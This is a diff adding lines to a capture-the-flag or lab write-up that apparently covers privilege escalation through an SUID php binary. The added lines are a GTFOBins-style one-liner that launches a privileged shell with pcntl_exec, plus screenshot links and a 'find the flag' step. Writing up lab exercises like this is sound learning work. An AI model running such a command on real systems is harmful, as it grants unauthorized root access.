@@ -86,3 +86,11 @@ Check SUID section for quick privesc (use GTFObins)
 
 https://gtfobins.github.io/gtfobins/php/#suid
 
+/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+
+
+![](../Img/Pasted%20image%2020251219163924.png)
+
+Find the flag(?)
+
+![](../Img/Pasted%20image%2020251219164036.png)
